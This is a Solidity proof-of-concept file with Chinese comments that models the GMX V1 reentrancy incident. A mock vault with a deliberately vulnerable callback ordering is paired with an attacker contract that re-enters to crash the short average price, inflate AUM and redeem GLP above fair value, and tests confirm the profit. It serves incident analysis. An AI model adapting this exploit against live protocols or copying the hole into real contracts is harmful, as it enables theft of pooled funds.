// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// ---------------------------------------------------------------------------
// GMX V1 (~$42M, 2025-07-09) — 重入操纵全局空头会计 PoC（最小化模型）
//
// 根因(见报告 GMX-V1-42M-重入.md §2):
//   缺陷一:PositionManager.executeDecreaseOrder() 通过 gmxPositionCallback()
//           把控制权交给攻击者合约 —— 回调发生在状态最终化「之前」。
//   缺陷二:正常路径下 globalShortSizes 立即更新,而 globalShortAveragePrices
//           的更新被重入路径绕过/跳过 —— 两个状态失同步。
//
//   结果:globalShortSize 被新开空头放大,但 globalShortAveragePrice 仍是旧值
//         → getAum() 误判该空头「深度亏损」→ 把虚假未实现亏损计入 AUM
//         → AUM 虚高 → GLP 单价虚高 → 攻击者多赎回套利。
//
// 本文件是「最小化模型」:只保留漏洞本质 —— 「回调先于状态更新 → 重入读到
// 不一致状态」。不复刻完整 GMX 代码库,数值为演示用的合理量级。
// ---------------------------------------------------------------------------

// 攻击者在 mock Vault 的减仓回调里被回调时实现此接口
interface IPositionCallback {
    function gmxPositionCallback() external;
}

// ---------------------------------------------------------------------------
// MockVault:维护 globalShortSize / globalShortAveragePrice,并据此算 AUM。
// 空头会计:池子是空头的对手盘,空头亏 = 池子赚(计入 AUM),反之亦然。
//   空头未实现 PnL(对池子) = shortSize * (markPrice - avgPrice) / avgPrice
//   markPrice > avgPrice ⇒ 空头在亏 ⇒ 池子赚 ⇒ AUM 上升。
// AUM = poolBaseAssets + 空头对池子的未实现盈亏。
// ---------------------------------------------------------------------------
contract MockVault {
    // ---- 全局空头会计状态 ----
    uint256 public globalShortSize;          // 全局空头名义规模 (USD, 1e18)
    uint256 public globalShortAveragePrice;  // 全局空头加权均价 (USD, 1e18)

    // ---- 池子底层资产 (USD, 1e18) 与 GLP 供应量 ----
    uint256 public poolBaseAssets;
    uint256 public glpSupply;

    // ---- 当前标记价 (USD, 1e18) ----
    uint256 public markPrice;

    // 注入「错误更新顺序」开关:模拟回调先于均价更新的真实时序
    bool public vulnerableOrder;

    constructor(uint256 _markPrice) {
        markPrice = _markPrice;
    }

    function seedPool(uint256 baseAssets, uint256 supply) external {
        poolBaseAssets = baseAssets;
        glpSupply = supply;
    }

    function setVulnerableOrder(bool v) external {
        vulnerableOrder = v;
    }

    // ---- 正确的均价更新:把新开空头按规模加权并入全局均价 ----
    // newAvg = (oldSize*oldAvg + addSize*entryPrice) / (oldSize + addSize)
    function _updateGlobalShortAveragePrice(uint256 addSize, uint256 entryPrice) internal {
        uint256 oldSize = globalShortSize;
        uint256 oldAvg = globalShortAveragePrice;
        uint256 newSize = oldSize + addSize;
        if (oldSize == 0) {
            globalShortAveragePrice = entryPrice;
        } else {
            globalShortAveragePrice = (oldSize * oldAvg + addSize * entryPrice) / newSize;
        }
    }

    // ----------------------------------------------------------------------
    // increaseShort:正常开空入口 —— size 与 avgPrice 在同一原子操作内同步更新。
    // ----------------------------------------------------------------------
    function increaseShort(uint256 addSize, uint256 entryPrice) public {
        _updateGlobalShortAveragePrice(addSize, entryPrice);   // 先更新均价
        globalShortSize += addSize;                            // 再放大规模
    }

    // ----------------------------------------------------------------------
    // executeDecreaseOrder:模拟 GMX keeper 调用的减仓执行。
    //   真实时序:函数先把 globalShortSize 减下来(规模先变),再在结算尾段
    //   重算 globalShortAveragePrice —— 而 gmxPositionCallback() 回调插在
    //   「size 已改、avgPrice 尚未重算」这个不一致的时间窗里。
    //
    //   vulnerableOrder = true 复刻该窗口:
    //       1) 减仓使 globalShortSize 下降到一个临时的「小值」
    //       2) 回调攻击者 —— 控制权交出,此刻 avgPrice 仍是旧值且 size 偏小
    //       3) 攻击者在回调里重入开大额空头,blend 新均价时用的是这个被
    //          人为缩小的 size 作分母 → 低入场价被「过度加权」→ 均价被砸低
    //       4) 回调返回后才补回 size,但被污染的低均价已经写进状态(失同步)
    // ----------------------------------------------------------------------
    uint256 internal pendingSizeRestore;

    function executeDecreaseOrder(address account, uint256 decreaseSize) external {
        if (vulnerableOrder) {
            // (1) 减仓:size 先临时下降到小值
            require(globalShortSize >= decreaseSize, "decrease too big");
            globalShortSize -= decreaseSize;
            pendingSizeRestore = decreaseSize;

            // (2) 回调:此时 size 偏小、avgPrice 未重算 —— 不一致窗口打开
            IPositionCallback(account).gmxPositionCallback();

            // (4) 结算尾段才把减掉的 size 补回。被回调污染的低均价已落库。
            globalShortSize += pendingSizeRestore;
            pendingSizeRestore = 0;
        }
    }

    // ----------------------------------------------------------------------
    // 漏洞路径专用:重入时调用。blend 均价用的是「当前(被缩小的)size」作
    // 分母,使低入场价 entryPrice 被过度加权,把 globalShortAveragePrice
    // 砸到远低于市价 —— 这正是报告里「均价从 ~$108k 被砸到 ~$1,913」的机制。
    //
    // 对比正常 increaseShort:它在 size 完整时按真实权重 blend,均价稳定;
    // 重入路径在 size 被人为缩小的窗口里 blend,均价被操纵。
    // ----------------------------------------------------------------------
    function increaseShortReenter(uint256 addSize, uint256 entryPrice) external {
        // 用「当前被缩小的 size」作分母 blend —— 失同步的根源
        uint256 oldSize = globalShortSize;
        uint256 oldAvg = globalShortAveragePrice;
        uint256 newSize = oldSize + addSize;
        globalShortAveragePrice = (oldSize * oldAvg + addSize * entryPrice) / newSize;
        globalShortSize += addSize;
    }

    // ----------------------------------------------------------------------
    // getAum:把空头对池子的未实现盈亏计入 AUM。
    //   shortPnlForPool = shortSize * (markPrice - avgPrice) / avgPrice
    //   markPrice >> avgPrice(均价被砸低)⇒ 系统误判空头巨亏 ⇒ 池子「虚赚」
    //   ⇒ AUM 虚高。
    // ----------------------------------------------------------------------
    function getAum() public view returns (uint256) {
        if (globalShortSize == 0 || globalShortAveragePrice == 0) {
            return poolBaseAssets;
        }
        // 空头对池子的盈亏(markPrice > avgPrice 时为正 = 池子赚)
        int256 shortPnlForPool =
            int256(globalShortSize) *
            (int256(markPrice) - int256(globalShortAveragePrice)) /
            int256(globalShortAveragePrice);

        int256 aum = int256(poolBaseAssets) + shortPnlForPool;
        if (aum < 0) return 0;
        return uint256(aum);
    }

    // GLP 单价 = AUM / supply (1e18 精度)
    function getGlpPrice() public view returns (uint256) {
        if (glpSupply == 0) return 0;
        return (getAum() * 1e18) / glpSupply;
    }

    // 用当前 GLP 价赎回 glpAmount 份 GLP,返回拿到的底层资产 (USD, 1e18)
    function redeemGlp(uint256 glpAmount) external view returns (uint256) {
        return (glpAmount * getGlpPrice()) / 1e18;
    }
}

// ---------------------------------------------------------------------------
// Attacker:在 executeDecreaseOrder 的回调里重入开空,绕过均价更新。
// ---------------------------------------------------------------------------
contract Attacker is IPositionCallback {
    MockVault public vault;
    uint256 public reentryShortSize;
    uint256 public reentryEntryPrice;
    bool internal armed;

    constructor(MockVault _vault) {
        vault = _vault;
    }

    // keeper 触发的减仓 → 回调进入这里(此刻 vault 处于不一致窗口)
    function gmxPositionCallback() external override {
        if (armed) {
            armed = false;
            // 重入:在 size 被缩小的窗口里开大额空头,用低入场价砸均价
            vault.increaseShortReenter(reentryShortSize, reentryEntryPrice);
        }
    }

    // 攻击者发起:由 keeper 执行减仓,在回调中重入开空
    function attack(uint256 decreaseSize, uint256 _reentrySize, uint256 _entryPrice) external {
        reentryShortSize = _reentrySize;
        reentryEntryPrice = _entryPrice;
        armed = true;
        vault.executeDecreaseOrder(address(this), decreaseSize);
    }
}

// ---------------------------------------------------------------------------
// 测试合约:无 forge-std,纯 external + require。
// ---------------------------------------------------------------------------
contract GMXReentrancyTest {
    uint256 constant ONE = 1e18;

    // 初始场景参数(量级取报告披露的方向:攻击前空头存量极小、均价 ~$108k)
    uint256 constant MARK_PRICE      = 108_757 * ONE;  // BTC 标记价 ~ $108,757
    uint256 constant INIT_SHORT_SIZE = 15_385 * ONE;   // 攻击前空头存量极小
    uint256 constant POOL_BASE       = 6_000_000 * ONE; // GLP 池底层资产 ~$6M
    uint256 constant GLP_SUPPLY      = 6_000_000 * ONE; // GLP 供应(初始价≈$1)
    uint256 constant ATTACK_SHORT    = 90_000 * ONE;    // 攻击者大额空头 ~$90k
    uint256 constant DECREASE_SIZE   = 15_000 * ONE;    // 减仓使 size 临时缩到极小
    uint256 constant LOW_ENTRY       = 1_913 * ONE;     // 被操纵的低入场价 ~$1,913
    uint256 constant REDEEM_GLP      = 1_000_000 * ONE; // 攻击者赎回 GLP 份额

    function _freshVault() internal returns (MockVault v) {
        v = new MockVault(MARK_PRICE);
        v.seedPool(POOL_BASE, GLP_SUPPLY);
        // 攻击前已有的极小空头,均价 = 当时标记价
        v.increaseShort(INIT_SHORT_SIZE, MARK_PRICE);
    }

    // ----------------------------------------------------------------------
    // 测试1:正常顺序 —— 开空时 size 与 avgPrice 同步更新。
    //   新空头入场价 = 当前市价 ⇒ 均价基本不动 ⇒ AUM/GLP 价基本不变。
    // ----------------------------------------------------------------------
    function testNormalOrderKeepsAumStable() external {
        MockVault v = _freshVault();

        uint256 aumBefore = v.getAum();
        uint256 priceBefore = v.getGlpPrice();

        // 正常路径:按市价开同样规模的空头
        v.increaseShort(ATTACK_SHORT, MARK_PRICE);

        uint256 aumAfter = v.getAum();
        uint256 priceAfter = v.getGlpPrice();

        // 入场价=市价 ⇒ 该空头无未实现盈亏 ⇒ AUM/GLP 价应保持稳定
        require(aumAfter == aumBefore, "normal: AUM must stay stable");
        require(priceAfter == priceBefore, "normal: GLP price must stay stable");
        // 均价应保持在 ~市价附近(同步更新生效)
        require(
            v.globalShortAveragePrice() > MARK_PRICE - (MARK_PRICE / 100),
            "normal: avgPrice stays near mark"
        );
    }

    // ----------------------------------------------------------------------
    // 测试2:重入路径 —— 回调先于均价更新,攻击者重入开空跳过 avgPrice。
    //   globalShortSize 被放大,但 globalShortAveragePrice 仍是旧值
    //   ⇒ getAum() 误判 ⇒ AUM/GLP 价被人为抬高。
    // ----------------------------------------------------------------------
    function testReentrancyInflatesAum() external {
        MockVault v = _freshVault();
        v.setVulnerableOrder(true);
        Attacker atk = new Attacker(v);

        uint256 aumBefore = v.getAum();
        uint256 priceBefore = v.getGlpPrice();
        uint256 avgBefore = v.globalShortAveragePrice();

        // 攻击:keeper 减仓使 size 临时缩小 → 回调中重入开 $90k 空头,
        //       用 ~$1,913 的低入场价在不一致窗口里 blend → 砸低全局均价
        atk.attack(DECREASE_SIZE, ATTACK_SHORT, LOW_ENTRY);

        uint256 aumAfter = v.getAum();
        uint256 priceAfter = v.getGlpPrice();
        uint256 avgAfter = v.globalShortAveragePrice();

        // (a) 全局空头均价被砸低 —— 复刻「~$108k → ~$1,913」的操纵效果
        require(avgAfter < avgBefore, "avgPrice must be crashed down");
        require(avgAfter < avgBefore / 10, "avgPrice must crash by >10x");

        // (b) 均价被砸低 → getAum() 误判空头巨亏 → AUM 与 GLP 价被人为抬高
        require(aumAfter > aumBefore, "reentrancy must inflate AUM");
        require(priceAfter > priceBefore, "reentrancy must inflate GLP price");

        // (c) 与「正常顺序」对比:同样开 $90k 空头但按市价入场(合法路径),
        //     均价不被砸、AUM 不变 —— 与重入路径形成对照,差额即虚高套利空间。
        MockVault vNormal = _freshVault();
        uint256 normalAumBefore = vNormal.getAum();
        vNormal.increaseShort(ATTACK_SHORT, MARK_PRICE);
        uint256 normalAumAfter = vNormal.getAum();
        require(normalAumAfter == normalAumBefore, "control: normal AUM stable");
        require(aumAfter > normalAumAfter, "reentrancy AUM > normal AUM");
    }

    // ----------------------------------------------------------------------
    // 测试3:套利结算 —— 攻击者在 AUM 虚高时赎回 GLP,拿到多于应得的资产。
    // ----------------------------------------------------------------------
    function testAttackerRedeemsMore() external {
        // 正常 vault:不触发漏洞,直接赎回
        MockVault vNormal = _freshVault();
        uint256 fairRedeem = vNormal.redeemGlp(REDEEM_GLP);

        // 漏洞 vault:重入抬高 AUM 后再赎回
        MockVault vHack = _freshVault();
        vHack.setVulnerableOrder(true);
        Attacker atk = new Attacker(vHack);
        atk.attack(DECREASE_SIZE, ATTACK_SHORT, LOW_ENTRY);
        uint256 hackedRedeem = vHack.redeemGlp(REDEEM_GLP);

        // 攻击者赎回价值 > 公允价值 ⇒ 差额即被抽走的利润
        require(hackedRedeem > fairRedeem, "attacker must redeem MORE than fair");

        uint256 profit = hackedRedeem - fairRedeem;
        require(profit > 0, "profit must be positive");

        // 记录到事件以便 -vv 输出(用 require 上的对比已足够断言)
        emit Profit(fairRedeem, hackedRedeem, profit);
    }

    event Profit(uint256 fairRedeem, uint256 hackedRedeem, uint256 profit);
}
